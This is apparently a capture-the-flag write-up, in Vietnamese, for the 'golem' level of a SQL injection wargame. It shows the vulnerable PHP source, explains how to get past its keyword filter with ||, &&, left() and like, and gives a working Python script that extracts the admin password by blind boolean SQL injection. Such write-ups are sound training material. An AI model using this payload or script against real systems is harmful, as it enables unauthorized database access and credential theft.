golem
===
### Description
- Source:
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

### Soluition
- Phân tích code: Ở bài chương trình cho chúng ta nhập vào ở `pw` và filter  `or, and, substr, =`. Để giải quyết bài này chúng ta cần nhập `pw` đúng với kết quả của `pw` được trả về trong database.
- Chúng ta có thể thay thế `or` bằng `||`, `and` bằng `&&`, `substr` bằng `mid, left, right,...` ở đây mình sử dụng left, `=` bằng `like`

#### Payload
- Code:
```
import requests
import string

url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
header = {'Cookie':'PHPSESSID=l0ppfki89ui4onrms8661i27el'}
flag = ''
lists = string.digits+string.ascii_lowercase+string.ascii_uppercase
for i in range(1,256):
  for j in lists:
    temp = flag+j
    param = f"pw='||true%26%26left(pw,{i}) like binary '{temp}'-- -"
    print(param)
    r = requests.get(url=url,params=param,headers=header)
    if "Hello admin" in r.text:
      flag += j
      print(flag)
      break
  if len(flag)==8:
    exit(0)
```